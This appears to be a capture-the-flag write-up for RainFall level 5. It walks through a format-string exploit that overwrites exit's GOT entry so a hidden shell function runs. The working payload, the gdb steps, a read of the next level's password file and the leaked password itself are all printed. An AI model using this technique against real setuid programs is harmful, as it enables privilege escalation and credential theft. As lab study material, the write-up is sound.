Level5 protections:
```Shell
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level5/level5
```

Level5 rights:
```Shell
level5@RainFall:~$ ls -la level5 
-rwsr-s---+ 1 level6 users 5385 Mar  6  2016 level5
```

This binary has the same behaviour as the other one.
Decompiling with Ghidra on https://dogbolt.org/ shows the main difference with the previous executable: there is an uncalled function `o()` that opens a shell. The `n()` function also calls `printf()` and `exit()`.
Once again, we can exploit `printf()` the way we did before; however, we need to find access to the `o()` function.

The goal is to redirect the flow of execution towards `o()` perhaps by replacing the call to `exit()` by a call to `o()`.
First, let's find the address where the address of `exit()` is stored. This required learning about [GOT](https://ctf101.org/binary-exploitation/what-is-the-got/)(Global Offset Table).
Let's disassemble `n()`:
```Shell
(gdb) disas n
Dump of assembler code for function n:
[...]
   0x080484ff <+61>:    call   0x80483d0 <exit@plt>
End of assembler dump.
```
This is not `exit()` address, but a call to a function that fetches `exit()`. So let's disassemble it as well:
```Shell
(gdb) disas 0x80483d0
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:     jmp    *0x8049838
   0x080483d6 <+6>:     push   $0x28
   0x080483db <+11>:    jmp    0x8048370
End of assembler dump.
```

We can see that the first step consists in jumping to an address. The `x` option in gdb allows us to view the memory content at a specified address or a variable name. If we investigate this address, this is what we get:
```Shell
(gdb) x 0x8049838
0x8049838 <exit@got.plt>:       0x080483d6
```
Therefore the jump was indeed done to the address of `exit()`, which converted to little endian is: `\x38\x98\x04\x08`. This will be the first part of our payload, as it will sit at the start of our buffer.

Now let's get the address of `o()`:
```Shell
(gdb) x o
0x80484a4 <o>:  0x83e58955
```
This is the address of `o()` in decimal: 134513824. Why decimal? Because just like the previous exploit, we will use `%d` to rewrite a value with `%n`. So what we want is this: the address of `exit()` must be overwritten by the address of `o()`, so we'll pass it as decimal to be able to use `%n`. 

Finally, in order to give the right argument from the stack to `%n`, let's find our buffer's index:
```Shell
level5@RainFall:~$ ./level5 
AAAA %p %p %p %p
AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141
```
Now we know it starts at the 4th index.

Our payload will be:
```Shell
python -c 'print("\x38\x98\x04\x08" + "%134513824d%4$n")' > /tmp/payload5
```

And the result is:
```Shell
level5@RainFall:~$ cat /tmp/payload5 - | ./level5
[...]
512
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
